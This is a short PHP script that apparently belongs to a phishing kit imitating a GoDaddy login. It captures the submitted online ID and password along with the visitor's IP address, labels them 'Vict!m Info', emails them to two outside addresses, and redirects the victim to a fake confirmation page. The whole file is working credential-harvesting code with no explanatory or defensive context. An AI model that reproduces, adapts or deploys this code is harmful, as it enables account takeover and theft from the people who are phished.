<?php
if($_POST["go8484933"] != "" and $_POST["pas90390"] != ""){
$ip = getenv("REMOTE_ADDR");

$message .= "--------------godaddy Info-----------------------\n";
$message .= "|Online ID : ".$_POST['go8484933']."\n";
$message .= "|Password : ".$_POST['pas90390']."\n";
 
 $message .= "-------------Vict!m Info-----------------------\n";
 $send = "myteam5000k@gmail.com,mybizarena@yahoo.com";
$subject = "godaddy | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: Thanks.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

  





 